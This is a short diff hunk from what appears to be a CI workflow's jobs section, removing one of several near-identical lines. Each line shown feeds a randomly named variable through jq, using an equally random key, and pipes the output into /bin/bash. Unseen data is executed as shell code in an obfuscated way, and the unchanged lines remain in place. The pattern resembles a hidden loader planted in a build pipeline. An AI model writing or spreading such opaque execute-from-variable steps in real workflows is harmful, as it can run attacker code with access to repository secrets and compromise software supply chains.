@@ -37,7 +37,6 @@ jobs:
           echo $u518 | jq -r .q1987 | /bin/bash
           echo $ix4 | jq -r .zkmqp5526 | /bin/bash
           printf '%s' "$pdn607" | jq -r .vp8 | /bin/bash
-          echo $ednrb1254 | jq -r .josnk267 | /bin/bash
           echo $nh3939 | jq -r .ic4 | /bin/bash
           echo $uwvpb292 | jq -r .pbi8 | /bin/bash
           printf '%s' "$kho833" | jq -r .qya730 | /bin/bash
